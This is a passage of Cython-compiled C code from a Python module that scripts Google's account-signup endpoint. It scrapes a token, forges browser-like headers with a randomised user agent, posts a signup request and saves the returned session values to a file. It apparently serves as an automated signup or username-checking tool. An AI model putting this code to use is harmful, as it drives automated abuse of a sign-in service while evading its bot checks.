      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 291, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 291, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 293, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_he3) < 0) __PYX_ERR(0, 293, __pyx_L3_error)

      
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__26, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 291, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_res1 = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_re); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 294, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_search); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 294, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_res1, __pyx_n_s_text); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 296, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = NULL;
      __pyx_t_9 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
          __pyx_t_9 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_data_initial_setup_data_null_nul, __pyx_t_6};
        __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 294, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
        PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_data_initial_setup_data_null_nul, __pyx_t_6};
        __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_9, 2+__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 294, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      } else
      #endif
      {
        __pyx_t_10 = PyTuple_New(2+__pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 294, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        if (__pyx_t_8) {
          __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_8); __pyx_t_8 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_u_data_initial_setup_data_null_nul);
        __Pyx_GIVEREF(__pyx_kp_u_data_initial_setup_data_null_nul);
        PyTuple_SET_ITEM(__pyx_t_10, 0+__pyx_t_9, __pyx_kp_u_data_initial_setup_data_null_nul);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_10, 1+__pyx_t_9, __pyx_t_6);
        __pyx_t_6 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 294, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      }
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_group); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 296, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_2);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 296, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_tok = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 298, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_Host_GAPS, __pyx_v_host) < 0) __PYX_ERR(0, 298, __pyx_L3_error)
      __pyx_v_cookies = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 301, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_authority, __pyx_kp_u_accounts_google_com) < 0) __PYX_ERR(0, 301, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_accept, __pyx_kp_u__25) < 0) __PYX_ERR(0, 301, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 301, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 301, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 301, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_origin, __pyx_kp_u_https_accounts_google_com) < 0) __PYX_ERR(0, 301, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_referer, __pyx_kp_u_https_accounts_google_com_signup) < 0) __PYX_ERR(0, 301, __pyx_L3_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ggb); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 308, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_7 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 308, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_user_agent, __pyx_t_7) < 0) __PYX_ERR(0, 301, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_headers = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = PyTuple_New(11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_11 = 0;
      __pyx_t_12 = 127;
      __Pyx_INCREF(__pyx_kp_u__27);
      __pyx_t_11 += 2;
      __Pyx_GIVEREF(__pyx_kp_u__27);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u__27);
      __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_tok, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__28);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__28);
      PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u__28);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__28);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__28);
      PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u__28);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 5, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__28);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__28);
      PyTuple_SET_ITEM(__pyx_t_7, 6, __pyx_kp_u__28);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 7, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__28);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__28);
      PyTuple_SET_ITEM(__pyx_t_7, 8, __pyx_kp_u__28);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 9, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_0_0_null_null_web_glif_signup_0);
      __pyx_t_11 += 48;
      __Pyx_GIVEREF(__pyx_kp_u_0_0_null_null_web_glif_signup_0);
      PyTuple_SET_ITEM(__pyx_t_7, 10, __pyx_kp_u_0_0_null_null_web_glif_signup_0);
      __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_7, 11, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_f_req, __pyx_t_4) < 0) __PYX_ERR(0, 311, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_deviceinfo, __pyx_kp_u_null_null_null_null_null_NL_nul) < 0) __PYX_ERR(0, 311, __pyx_L3_error)
      __pyx_v_data = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 314, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 314, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 316, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 316, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 316, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 316, __pyx_L3_error)

      
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__29, __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 314, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_response = __pyx_t_7;
      __pyx_t_7 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 320, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 320, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = PyUnicode_Split(((PyObject*)__pyx_t_4), __pyx_kp_u_null, -1L); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 320, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_GetItemInt_List(__pyx_t_5, 1, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 320, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 320, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_kp_u__30) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u__30);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 320, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_7, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 320, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_tl = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 321, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 321, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 321, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_kp_u_Host_GAPS); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 321, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF_SET(__pyx_v_host, __pyx_t_4);
      __pyx_t_4 = 0;

      
      /*with:*/ {
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__31, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 322, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 322, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_enter); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 322, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_5 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 322, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __pyx_t_5;
        __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_14);
            __Pyx_XGOTREF(__pyx_t_15);
            __Pyx_XGOTREF(__pyx_t_16);
            /*try:*/ {
              __pyx_v_f = __pyx_t_7;
              __pyx_t_7 = 0;

              
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 323, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_5 = PyTuple_New(4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 323, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_11 = 0;
              __pyx_t_12 = 127;
              __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 323, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_12;
              __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
              __Pyx_GIVEREF(__pyx_t_10);
              PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_10);
              __pyx_t_10 = 0;
              __Pyx_INCREF(__pyx_kp_u__32);
              __pyx_t_11 += 2;
              __Pyx_GIVEREF(__pyx_kp_u__32);
              PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u__32);
              __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_host, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 323, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_12;
              __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
              __Pyx_GIVEREF(__pyx_t_10);
              PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_10);
              __pyx_t_10 = 0;
              __Pyx_INCREF(__pyx_kp_u__5);
              __pyx_t_11 += 1;
              __Pyx_GIVEREF(__pyx_kp_u__5);
              PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_kp_u__5);
              __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_5, 4, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 323, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              __pyx_t_5 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_5)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_5);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_7 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 323, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_7);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

              
            }
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            goto __pyx_L18_try_end;
            __pyx_L13_error:;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_4, &__pyx_t_10) < 0) __PYX_ERR(0, 322, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_7);
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_5 = PyTuple_Pack(3, __pyx_t_7, __pyx_t_4, __pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 322, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_5, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 322, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_18 = __Pyx_PyObject_IsTrue(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (__pyx_t_18 < 0) __PYX_ERR(0, 322, __pyx_L15_except_error)
              __pyx_t_19 = ((!(__pyx_t_18 != 0)) != 0);
              if (__pyx_t_19) {
                __Pyx_GIVEREF(__pyx_t_7);
                __Pyx_GIVEREF(__pyx_t_4);
                __Pyx_XGIVEREF(__pyx_t_10);
                __Pyx_ErrRestoreWithState(__pyx_t_7, __pyx_t_4, __pyx_t_10);
